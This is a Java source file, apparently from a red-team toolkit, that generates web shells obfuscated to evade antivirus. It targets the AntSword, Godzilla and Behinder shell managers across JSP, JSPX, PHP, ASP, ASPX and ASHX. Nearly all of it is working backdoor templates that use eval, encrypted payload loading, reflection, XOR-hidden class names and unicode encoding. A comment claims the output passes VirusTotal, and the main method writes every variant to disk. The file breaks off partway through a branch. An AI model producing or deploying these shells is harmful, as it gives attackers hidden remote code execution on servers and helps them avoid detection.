package com.potato.potatotool.content.redTeam;

import com.potato.potatotool.utils.strUtils;

import java.io.File;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


/**
 * @author Potato
 * @date 2023/4/4 10:20
 */
public class webShell {

    /**
    * 测试调用，接入时请模拟传参
     * unicode vt全过
    */
    public static void main(String []args) throws NoSuchAlgorithmException {

        HashMap<String, HashMap<String, String[][]>> multiDict = new HashMap<String, HashMap<String, String[][]>>();

        multiDict.put("", new HashMap<String, String[][]>());
        multiDict.put("Godzilla", new HashMap<String, String[][]>());
        multiDict.put("Behinder", new HashMap<String, String[][]>());
        multiDict.put("AntSword", new HashMap<String, String[][]>());
        multiDict.put("Cmd", new HashMap<String, String[][]>());

        multiDict.get("AntSword").put("jsp", new String[][]{ {"default"}, {"default", "unicode"} });
        multiDict.get("AntSword").put("jspx", new String[][]{ {"default"}, {"default", "unicode"} });
        multiDict.get("AntSword").put("php", new String[][]{ {"default"}, {"base64"} });
        multiDict.get("AntSword").put("asp", new String[][]{ {"default"} });
        multiDict.get("AntSword").put("aspx", new String[][]{ {"default"} });

        multiDict.get("Godzilla").put("jsp", new String[][]{ {"AES", "RAW"}, {"AES", "RAW", "unicode"} });
        multiDict.get("Godzilla").put("jspx", new String[][]{ {"AES", "RAW"}, {"AES", "RAW", "unicode"} });
        multiDict.get("Godzilla").put("php", new String[][]{ {"XOR", "base64"} });
        multiDict.get("Godzilla").put("asp", new String[][]{ {"RAW"} });
        multiDict.get("Godzilla").put("aspx", new String[][]{ {"CSHARP", "AES", "RAW"} });
        multiDict.get("Godzilla").put("ashx", new String[][]{ {"CSHARP", "AES", "RAW"} });

        multiDict.get("Behinder").put("jsp", new String[][]{ {"default"}, {"default", "unicode"} });
        multiDict.get("Behinder").put("jspx", new String[][]{ {"default"}, {"default", "unicode"} });
        multiDict.get("Behinder").put("php", new String[][]{ {"default"} });
        multiDict.get("Behinder").put("asp", new String[][]{ {"default"} });
        multiDict.get("Behinder").put("aspx", new String[][]{ {"default"} });

        multiDict.get("Cmd").put("jsp", new String[][]{ {"default"}, {"reflect"}, {"default", "unicode"}, {"reflect", "unicode"} });
        multiDict.get("Cmd").put("jspx", new String[][]{ {"default"}, {"reflect"}, {"default", "unicode"}, {"reflect", "unicode"} });
        multiDict.get("Cmd").put("ashx", new String[][]{ {"default"} });

        for (String outerKey : multiDict.keySet()) {
            for (String innerKey : multiDict.get(outerKey).keySet()) {
                for (String[] value : multiDict.get(outerKey).get(innerKey)) {

                    String webShell_Manager = outerKey;
                    String scriptMethod = innerKey;
                    String[] enMethod = value;
                    String pass = "123";
                    String aesKey = strUtils.md5(pass).substring(0, 16);

                    String webShellData = getWebShell(webShell_Manager, scriptMethod, enMethod, pass, aesKey);

                    String enMothod_Str =  String.join("_", enMethod);
                    String fileName = "."+File.separator+"src"+File.separator+"result"+File.separator + scriptMethod  + File.separator + webShell_Manager + "_" + enMothod_Str + "." + scriptMethod;
                    fileName = fileName.replace("__", "_").replace("_.", ".");
                    strUtils.createFile(webShellData, fileName);

                }
            }
        }

    }

    /**
     * @param webShell_Manager webShell管理器名称
     * @param scriptMethod     脚本语言
     * @param enMethod         加密方式
     * @param pass             连接密码
     * @param aesKey           AESkey(默认pass-md5-前16位)
     * @return                 免杀webShell
     */
    public static String getWebShell(String webShell_Manager, String scriptMethod, String[] enMethod, String pass, String aesKey) throws NoSuchAlgorithmException {

        String webShellCode = "";

        String[] randomString = strUtils.createRandomStringList(30);

        // 蚁剑码免杀
        if (webShell_Manager.equals("AntSword")){

            if (scriptMethod.equals("jsp")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<% String {{0}} = request.getParameter(\"{{pass}}\");if ({{0}} != null) {class {{1}} extends /*{{2}}*/ ClassLoader {{{1}}(ClassLoader {{3}}) {super({{3}});}public Class {{0}}(byte[] {{4}}) {return super.defineClass({{4}}, 0, {{4}}.length);}}byte[] {{5}} = null;try {int[] {{6}} = new int[] {99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String {{7}} = \"\";for (int i = 0; i < {{6}}.length; i++) {{{6}}[i] = {{6}}[i] ^ 0x010;{{7}} = {{7}} + (char) {{6}}[i];}Class {{8}} = Class.forName({{7}});String {{9}} = new String(new byte[] {100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114});{{5}} = (byte[]) {{8}}.getMethod({{9}}, String.class).invoke({{8}}.newInstance(), {{0}});} catch (Exception e) {int[] {{6}} = new int[] {122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String {{7}} = \"\";for (int i = 0; i < {{6}}.length; i++) {{{6}}[i] = {{6}}[i] ^ 0x010;{{7}} = {{7}} + (char) {{6}}[i];}Class {{10}} = Class.forName({{7}});Object {{11}} = {{10}}.getMethod(\"getDecoder\").invoke(null);{{5}} = (byte[]) {{11}}.getClass().getMethod(\"decode\", String.class).invoke({{11}}, {{0}});}Class {{12}} = new {{1}}(Thread.currentThread().getContextClassLoader()).{{0}}({{5}});Object {{13}} = {{12}}.newInstance();{{13}}.equals(pageContext);} else {/*response.sendError(404);*/} %>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("unicode"))){

                    String regex = "<%\\s*(.*?)\\s*%>";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(webShellCode);
                    while (matcher.find()) {

                        String substring = matcher.group(1);
                        String unicodeEncoded = "//\\uuu000a" + strUtils.toUnicode(substring, Boolean.TRUE);
                        webShellCode = webShellCode.replace(substring, unicodeEncoded);

                    }

                }

            }
            else if (scriptMethod.equals("jspx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n<hi:scriptlet>\nString {{0}} = request.getParameter(\"{{pass}}\");if ({{0}} != null) {class {{1}} extends /*{{2}}*/ ClassLoader {{{1}}(ClassLoader {{3}}) {super({{3}});}public Class {{0}}(byte[] {{4}}) {return super.defineClass({{4}}, 0, {{4}}.length);}}byte[] {{5}} = null;try {int[] {{6}} = new int[] {99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String {{7}} = \"\";for (int i = 0; i &lt; {{6}}.length; i++) {{{6}}[i] = {{6}}[i] ^ 0x010;{{7}} = {{7}} + (char) {{6}}[i];}Class {{8}} = Class.forName({{7}});String {{9}} = new String(new byte[] {100, 101, 99, 111, 100, 101, 66, 117, 102, 102, 101, 114});{{5}} = (byte[]) {{8}}.getMethod({{9}}, String.class).invoke({{8}}.newInstance(), {{0}});} catch (Exception e) {int[] {{6}} = new int[] {122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String {{7}} = \"\";for (int i = 0; i &lt; {{6}}.length; i++) {{{6}}[i] = {{6}}[i] ^ 0x010;{{7}} = {{7}} + (char) {{6}}[i];}Class {{10}} = Class.forName({{7}});Object {{11}} = {{10}}.getMethod(\"getDecoder\").invoke(null);{{5}} = (byte[]) {{11}}.getClass().getMethod(\"decode\", String.class).invoke({{11}}, {{0}});}Class {{12}} = new {{1}}(Thread.currentThread().getContextClassLoader()).{{0}}({{5}});Object {{13}} = {{12}}.newInstance();{{13}}.equals(pageContext);} else {/*response.sendError(404);*/}\n</hi:scriptlet>\n</hi>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("unicode"))){

                    webShellCode = webShellCode.replace("&lt;", "<");

                    String regex = "<hi:scriptlet>\\n(.*?)</hi:scriptlet>";
                    Pattern pattern = Pattern.compile(regex, Pattern.DOTALL);// Pattern.DOTALL支持换行
                    Matcher matcher = pattern.matcher(webShellCode);
                    while (matcher.find()) {

                        String substring = matcher.group(1);
                        String unicodeEncoded = "//\\uuu000a" + strUtils.toUnicode(substring, Boolean.TRUE);
                        webShellCode = webShellCode.replace(substring, unicodeEncoded);

                    }

                }

            }
            else if (scriptMethod.equals("php")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<?php class {{0}} { public function __construct(${{1}}){ @eval(\"/*{{2}}*/\".${{1}}.\"/*{{3}}*/\"); }}new {{0}}($_REQUEST['{{pass}}']);?>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("base64"))){

                    webShellCode = "<?php class  {{0}}{/*{{1}}*/function __construct(${{4}}){${{5}}=str_rot13('ffreg');/*{{2}}*/$a= (\"!\"^\"@\").${{5}};/*{{3}}*/$a(${{4}});}}new  {{0}}($_REQUEST['{{pass}}']); ?>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }
            else if (scriptMethod.equals("asp")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<%\n<!--\nClass {{0}}\n    public property let {{1}}({{2}})\n    exeCute({{2}})\n    end property\nEnd Class\n\nSet {{5}}= New {{0}}\n{{5}}.{{1}}= request(\"{{pass}}\")\n-->\n%>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }
            else if (scriptMethod.equals("aspx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<% function {{0}}(){var {{1}}=\"unsa\",{{2}}=\"fe\",{{3}}={{1}}+{{2}};return {{3}};}var {{4}}:String=Request[\"{{pass}}\"];~eval/*{{5}}*/({{4}},{{0}}());%><%@Page Language=JS%>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }

        }

        // 哥斯拉免杀
        else if (webShell_Manager.equals("Godzilla")){

            if (scriptMethod.equals("jsp")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("AES", "RAW"))){

                    webShellCode = "<%! String {{0}} = \"{{aesKey}}\";class {{1}} extends ClassLoader {public {{1}}(ClassLoader {{2}}) {super({{2}});}public Class {{3}}(byte[] {{4}}) {return super.defineClass({{4}}, 0, {{4}}.length);}}public byte[] {{5}}(byte[] {{11}}, boolean {{12}}) {try {javax.crypto.Cipher {{6}} = javax.crypto.Cipher.getInstance(\"AES\");Class <? > {{7}} = Class.forName(\"javax.crypto.spec.SecretKeySpec\");java.lang.reflect.Constructor <? > {{8}} = {{7}}.getConstructor(byte[].class, String.class);javax.crypto.spec.SecretKeySpec {{9}} = (javax.crypto.spec.SecretKeySpec) {{8}}.newInstance({{0}}.getBytes(), \"AES\");{{6}}.init({{12}} ? 1 : 2, {{9}});byte[] result = (byte[]) {{6}}.getClass(). /*{{10}}*/ getDeclaredMethod /*{{10}}*/ (\"doFinal\", new Class[] {byte[].class}).invoke({{6}}, new Object[] {{{11}}});return result;} catch (Exception e) {return null;}} %> <%try {byte[] {{13}} = new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream {{14}} = request.getInputStream();int _num = 0;while ((_num += {{14}}.read({{13}}, _num, {{13}}.length)) < {{13}}.length);{{13}} = {{5}}({{13}}, false);if (session.getAttribute(\"payload\") == null) {session.setAttribute(\"payload\", new {{1}}(Thread.currentThread(). /*{{10}}*/ getContextClassLoader()).{{3}}({{13}}));} else {request.setAttribute(\"parameters\", {{13}});Object {{15}} = ((Class) session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream {{16}} = new java.io.ByteArrayOutputStream();{{15}}.equals( /*{{10}}*/ {{16}});{{15}}.equals( /*{{10}}*/ pageContext);{{15}}.toString();response.getOutputStream().write({{5}}({{16}}.toByteArray(), true));}} catch (Exception e) {/*response.sendError(404);*/} %>";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("AES", "RAW", "unicode"))){

                    String regex = "<%\\s*!\\s*(.*?)\\s%>|<%\\s*([^\\s*!].*?)\\s*%>";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(webShellCode);
                    while (matcher.find()) {

                        String substring;
                        String unicodeEncoded;

                        if (matcher.group(1)!= null){// 匹配<%\\s*!\\s*(.*?)\\s%>
                            substring = matcher.group(1);
                            unicodeEncoded = "//\\uuu000a" + strUtils.toUnicode(substring, Boolean.TRUE);
                        } else {// 匹配<%\\s*([^\\s*!].*?)\\s*%>
                            substring = matcher.group(2);
                            unicodeEncoded = strUtils.toUnicode(substring, Boolean.TRUE);
                        }

                        webShellCode = webShellCode.replace(substring, unicodeEncoded);

                    }

                }

            }
            else if (scriptMethod.equals("jspx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("AES", "RAW"))){

                    webShellCode = "<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n<hi:declaration>\nString {{0}} = \"{{aesKey}}\";class {{1}} extends ClassLoader {public {{1}}(ClassLoader {{2}}) {super({{2}});}public Class {{3}}(byte[] {{4}}) {return super.defineClass({{4}}, 0, {{4}}.length);}}public byte[] {{5}}(byte[] {{11}}, boolean {{12}}) {try {javax.crypto.Cipher {{6}} = javax.crypto.Cipher.getInstance(\"AES\");Class {{7}} = Class.forName(\"javax.crypto.spec.SecretKeySpec\");java.lang.reflect.Constructor {{8}} = {{7}}.getConstructor(byte[].class, String.class);javax.crypto.spec.SecretKeySpec {{9}} = (javax.crypto.spec.SecretKeySpec) {{8}}.newInstance({{0}}.getBytes(), \"AES\");{{6}}.init({{12}} ? 1 : 2, {{9}});byte[] result = (byte[]) {{6}}.getClass(). /*{{10}}*/ getDeclaredMethod /*{{10}}*/ (\"doFinal\", new Class[] {byte[].class}).invoke({{6}}, new Object[] {{{11}}});return result;} catch (Exception e) {return null;}}\n</hi:declaration>\n<hi:scriptlet>\ntry {byte[] {{13}} = new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream {{14}} = request.getInputStream();int _num = 0;while ((_num += {{14}}.read({{13}}, _num, {{13}}.length)) &lt; {{13}}.length);{{13}} = {{5}}({{13}}, false);if (session.getAttribute(\"payload\") == null) {session.setAttribute(\"payload\", new {{1}}(Thread.currentThread(). /*{{10}}*/ getContextClassLoader()).{{3}}({{13}}));} else {request.setAttribute(\"parameters\", {{13}});Object {{15}} = ((Class) session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream {{16}} = new java.io.ByteArrayOutputStream();{{15}}.equals( /*{{10}}*/ {{16}});{{15}}.equals( /*{{10}}*/ pageContext);{{15}}.toString();response.getOutputStream().write({{5}}({{16}}.toByteArray(), true));}} catch (Exception e) {/*response.sendError(404);*/}\n</hi:scriptlet>\n</hi>";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("AES", "RAW", "unicode"))){

                    webShellCode = webShellCode.replace("&lt;", "<");

                    String regex = "<hi:declaration>\\n(.*?)</hi:declaration>|<hi:scriptlet>\\n(.*?)</hi:scriptlet>";
                    Pattern pattern = Pattern.compile(regex, Pattern.DOTALL);// Pattern.DOTALL支持换行
                    Matcher matcher = pattern.matcher(webShellCode);
                    while (matcher.find()) {

                        String substring;
                        String unicodeEncoded;

                        if (matcher.group(1)!= null){// 匹配<hi:declaration>\\n(.*?)</hi:declaration>
                            substring = matcher.group(1);
                        } else {// 匹配<hi:scriptlet>\\n(.*?)</hi:scriptlet>
                            substring = matcher.group(2);
                        }

                        unicodeEncoded = "//\\uuu000a" + strUtils.toUnicode(substring, Boolean.TRUE);
                        webShellCode = webShellCode.replace(substring, unicodeEncoded);

                    }

                }

            }
            else if (scriptMethod.equals("php")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("XOR", "base64"))){

                    webShellCode = "<?php @session_start();@set_time_limit(0);@error_reporting(0);function {{1}}(${{2}},${{3}}){for($i=0;$i<strlen(${{2}});$i++){${{4}}=${{3}}[$i+1&15];${{2}}[$i]=${{2}}[$i]^${{4}};}return ${{2}};}${{5}}='payload';${{6}}='{{pass}}';${{7}}='{{aesKey}}';if(isset($_POST[${{6}}])){${{8}}=preg_filter('/\\s+/','','base 64 _ deco de');${{9}}=$_POST[${{6}}];${{10}}={{1}}(${{8}}(${{9}}.\"\"),${{7}});if(isset($_SESSION[${{5}}])){${{11}}={{1}}($_SESSION[${{5}}],${{7}});if(strpos(${{11}},\"getBasicsInfo\")===false){${{11}}={{1}}(${{11}},${{7}});}class {{12}}{public function __construct(${{11}}){@eval(\"/*{{13}}*/\".${{11}}.\"\");}}new {{12}}(${{11}});echo substr(md5(${{6}}.${{7}}),0,16);echo base64_encode({{1}}(@run(${{10}}),${{7}}));echo substr(md5(${{6}}.${{7}}),16);}else{if(strpos(${{10}},\"getBasicsInfo\")!==false){$_SESSION[${{5}}]={{1}}(${{10}},${{7}});}}}";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey).replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }
            else if (scriptMethod.equals("asp")){

                if (Arrays.asList(enMethod).contains("RAW")){

                    webShellCode = "<%\nSet {{0}} = Server.CreateObject(\"Scripting.Dictionary\")\n\nFunction {{1}}({{2}},{{3}})\n    dim {{4}},i,{{5}},{{6}}\n    {{6}} = len(key)\n    Set {{7}} = CreateObject(\"ADODB.Stream\")\n    {{7}}.CharSet = \"iso-8859-1\"\n    {{7}}.Type = 2\n    {{7}}.Open\n    if IsArray({{2}}) then\n        {{4}}=UBound({{2}})+1\n        For i=1 To {{4}}\n            {{7}}.WriteText chrw(ascb(midb({{2}},i,1)))\n        Next\n    end if\n    {{7}}.Position = 0\n    if {{3}} then\n        {{7}}.Type = 1\n        {{1}}={{7}}.Read()\n    else\n        {{1}}={{7}}.ReadText()\n    end if\n\nEnd Function\n    {{2}} = request.BinaryRead(request.TotalBytes)\n    if len(request.Cookies.Item(\"{{pass}}\"))>0  then\n        if  IsEmpty(Session(\"payload\")) then\n            {{2}}={{1}}({{2}},false)\n            Session(\"payload\")={{2}}\n            response.End\n        else\n            {{0}}.Add \"payload\",Session(\"payload\")\n            Execute({{0}}(\"payload\"))\n            {{5}}=run({{2}})\n            if not IsEmpty({{5}}) then\n                response.BinaryWrite {{5}}\n            end if\n        end if\n    end if\n%>";

                    webShellCode = webShellCode.replace("{{pass}}", pass);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }
            else if (scriptMethod.equals("aspx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("CSHARP", "AES", "RAW"))){

                    webShellCode = "<%try {string {{0}} = \"{{aesKey}}\";byte[] {{1}} = @Context.@Request.@BinaryRead(Context.Request.ContentLength);byte[] {{2}} = @System.@Text.@Encoding.@Default.@GetBytes({{0}});byte[] {{3}} = new @System.@Security.@Cryptography.@RijndaelManaged(). /*{{4}}*/ @CreateDecryptor({{2}}, {{2}}).@TransformFinalBlock({{1}}, 0, Context.Request.ContentLength);if (Context.Session[\"payload\"] == null) {Context.Session[\"payload\"] = (@System.@Reflection.@Assembly) typeof(@System.@Reflection.@Assembly).GetMethod(\"Load\", new @System.Type[] {typeof(byte[])}).Invoke(null, new object[] {{{3}}});} else {object {{5}} = ((@System.@Reflection.@Assembly) Context.Session[\"payload\"]).@CreateInstance(\"LY\");System.IO.MemoryStream {{6}} = new @System.@IO.@MemoryStream();{{5}}.Equals( /*{{4}}*/ {{6}});{{5}}.Equals( /*{{4}}*/ Context);{{5}}.Equals( /*{{4}}*/ {{3}});{{5}}.ToString();byte[] {{7}} = {{6}}.ToArray();{{6}}.Dispose();@Context.@Response.@BinaryWrite(new @System.@Security.@Cryptography.@RijndaelManaged(). /*{{4}}*/ @CreateEncryptor({{2}}, {{2}}).@TransformFinalBlock({{7}}, 0, {{7}}.Length));}} catch (System.Exception) {} %> <% @Page Language = \"CS\" %>";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }
            else if (scriptMethod.equals("ashx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("CSHARP", "AES", "RAW"))) {

                    webShellCode = "<% @WebHandler Language = \"CS\" Class = \"Handler3\" %>public class Handler3: System.Web.IHttpHandler, System.Web.SessionState.IRequiresSessionState {public void ProcessRequest(System.Web.HttpContext Context) {try {string {{0}} = \"{{aesKey}}\";byte[] {{1}} = Context.Request.BinaryRead(Context.Request.ContentLength);byte[] {{2}} = System.Text.Encoding.Default.GetBytes({{0}});byte[] {{3}} = new System.Security.Cryptography.RijndaelManaged(). /*{{4}}*/ @CreateDecryptor({{2}}, {{2}}).TransformFinalBlock({{1}}, 0, Context.Request.ContentLength);if (Context.Session[\"payload\"] == null) {Context.Session[\"payload\"] = (System.Reflection.Assembly) typeof(System.Reflection.Assembly).GetMethod(\"Load\", new System.Type[] {typeof(byte[])}).Invoke(null, new object[] {{{3}}});} else {object {{8}} = ((System.Reflection.Assembly) Context.Session[\"payload\"]).CreateInstance(\"LY\");System.IO.MemoryStream {{9}} = new System.IO.MemoryStream();{{8}}.Equals( /*{{5}}*/ {{9}});{{8}}.Equals( /*{{6}}*/ Context);{{8}}.Equals( /*{{7}}*/ {{3}});{{8}}.ToString();byte[] {{10}} = {{9}}.ToArray();{{9}}.Dispose();Context.Response.BinaryWrite(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor({{2}}, {{2}}).TransformFinalBlock({{10}}, 0, {{10}}.Length));}} catch (System.Exception) {}}public bool IsReusable {get {return false;}}}";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

            }

        }

        // 冰蝎免杀
        else if (webShell_Manager.equals("Behinder")){

            if (scriptMethod.equals("jsp")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<%! public byte[] {{0}}(String {{1}}, String {{2}}) throws Exception {javax.crypto.Cipher {{3}} = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");{{3}}.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance({{2}}.getBytes(), \"AES\"));byte[] {{4}};try {int[] {{5}} = new int[] {122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String {{6}} = \"\";for (int i = 0; i < {{5}}.length; i++) {{{5}}[i] = {{5}}[i] ^ 0x010;{{6}} = {{6}} + (char) {{5}}[i];}Class {{7}} = Class.forName({{6}});Object {{8}} = {{7}}.getMethod(\"getDecoder\").invoke(null);{{4}} = (byte[]) {{8}}.getClass().getMethod(\"decode\", String.class).invoke({{8}}, {{1}});} catch (Throwable e) {int[] {{5}} = new int[] {99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String {{6}} = \"\";for (int i = 0; i < {{5}}.length; i++) {{{5}}[i] = {{5}}[i] ^ 0x010;{{6}} = {{6}} + (char) {{5}}[i];}Class {{7}} = Class.forName({{6}});{{4}} = (byte[]) {{7}}.getMethod(\"decodeBuffer\", String.class).invoke({{7}}.newInstance(), {{1}});}byte[] {{9}} = (byte[]) {{3}}.getClass(). /*{{17}}*/ getDeclaredMethod /*{{18}}*/ (\"doFinal\", new Class[] {byte[].class}).invoke({{3}}, new Object[] {{{4}}});return {{9}};} %> <%try {String {{10}} = \"{{aesKey}}\";session.putValue(\"u\", {{10}});byte[] {{11}} = {{0}}(request.getReader().readLine(), {{10}});java. /*{{12}}*/ lang. /*{{13}}*/ reflect.Method {{0}} = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod /*{{14}}*/ (\"defineClass\", byte[].class, int /**/ .class, int /**/ .class);{{0}}.setAccessible(true);Class {{19}} = (Class) {{0}}.invoke(Thread.currentThread(). /*{{15}}*/ getContextClassLoader(), {{11}}, 0, {{11}}.length);Object {{20}} = {{19}}. /*{{16}}*/ newInstance();{{20}}.equals(pageContext);} catch (Exception e) {/*response.sendError(404);*/} %>";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("unicode"))){

                    String regex = "<%\\s*!\\s*(.*?)\\s%>|<%\\s*([^\\s*!].*?)\\s*%>";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(webShellCode);
                    while (matcher.find()) {

                        String substring;
                        String unicodeEncoded;

                        if (matcher.group(1)!= null){// 匹配<%\\s*!\\s*(.*?)\\s%>
                            substring = matcher.group(1);
                            unicodeEncoded = "//\\uuu000a" + strUtils.toUnicode(substring, Boolean.TRUE);
                        } else {// 匹配<%\\s*([^\\s*!].*?)\\s*%>
                            substring = matcher.group(2);
                            unicodeEncoded = strUtils.toUnicode(substring, Boolean.TRUE);
                        }

                        webShellCode = webShellCode.replace(substring, unicodeEncoded);

                    }

                }

            }
            else if (scriptMethod.equals("jspx")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

                    webShellCode = "<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n<hi:declaration>\npublic byte[] {{0}}(String {{1}}, String {{2}}) throws Exception {javax.crypto.Cipher {{3}} = javax.crypto.Cipher.getInstance(\"AES/ECB/PKCS5Padding\");{{3}}.init(javax.crypto.Cipher.DECRYPT_MODE, (javax.crypto.spec.SecretKeySpec) Class.forName(\"javax.crypto.spec.SecretKeySpec\").getConstructor(byte[].class, String.class).newInstance({{2}}.getBytes(), \"AES\"));byte[] {{4}};try {int[] {{5}} = new int[] {122, 113, 102, 113, 62, 101, 100, 121, 124, 62, 82, 113, 99, 117, 38, 36};String {{6}} = \"\";for (int i = 0; i &lt; {{5}}.length; i++) {{{5}}[i] = {{5}}[i] ^ 0x010;{{6}} = {{6}} + (char) {{5}}[i];}Class {{7}} = Class.forName({{6}});Object {{8}} = {{7}}.getMethod(\"getDecoder\").invoke(null);{{4}} = (byte[]) {{8}}.getClass().getMethod(\"decode\", String.class).invoke({{8}}, {{1}});} catch (Throwable e) {int[] {{5}} = new int[] {99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98};String {{6}} = \"\";for (int i = 0; i &lt; {{5}}.length; i++) {{{5}}[i] = {{5}}[i] ^ 0x010;{{6}} = {{6}} + (char) {{5}}[i];}Class {{7}} = Class.forName({{6}});{{4}} = (byte[]) {{7}}.getMethod(\"decodeBuffer\", String.class).invoke({{7}}.newInstance(), {{1}});}byte[] {{9}} = (byte[]) {{3}}.getClass(). /*{{17}}*/ getDeclaredMethod /*{{18}}*/ (\"doFinal\", new Class[] {byte[].class}).invoke({{3}}, new Object[] {{{4}}});return {{9}};}\n</hi:declaration>\n<hi:scriptlet>\ntry {String {{10}} = \"{{aesKey}}\";session.putValue(\"u\", {{10}});byte[] {{11}} = {{0}}(request.getReader().readLine(), {{10}});java. /*{{12}}*/ lang. /*{{13}}*/ reflect.Method {{0}} = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod /*{{14}}*/ (\"defineClass\", byte[].class, int /**/ .class, int /**/ .class);{{0}}.setAccessible(true);Class {{19}} = (Class) {{0}}.invoke(Thread.currentThread(). /*{{15}}*/ getContextClassLoader(), {{11}}, 0, {{11}}.length);Object {{20}} = {{19}}. /*{{16}}*/ newInstance();{{20}}.equals(pageContext);} catch (Exception e) {/*response.sendError(404);*/}\n</hi:scriptlet>\n</hi>";

                    webShellCode = webShellCode.replace("{{aesKey}}", aesKey);

                    webShellCode = strUtils.replaceFlags(webShellCode, randomString);

                }

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("unicode"))){

                    webShellCode = webShellCode.replace("&lt;", "<");

                    String regex = "<hi:declaration>\\n(.*?)</hi:declaration>|<hi:scriptlet>\\n(.*?)</hi:scriptlet>";
                    Pattern pattern = Pattern.compile(regex, Pattern.DOTALL);// Pattern.DOTALL支持换行
                    Matcher matcher = pattern.matcher(webShellCode);
                    while (matcher.find()) {

                        String substring;
                        String unicodeEncoded;

                        if (matcher.group(1) != null) {// 匹配<hi:declaration>\\n(.*?)</hi:declaration>
                            substring = matcher.group(1);
                        } else {// 匹配<hi:scriptlet>\\n(.*?)</hi:scriptlet>
                            substring = matcher.group(2);
                        }

                        unicodeEncoded = "//\\uuu000a" + strUtils.toUnicode(substring, Boolean.TRUE);
                        webShellCode = webShellCode.replace(substring, unicodeEncoded);

                    }
                }

            }
            else if (scriptMethod.equals("php")){

                if (Arrays.asList(enMethod).containsAll(Arrays.asList("default"))){

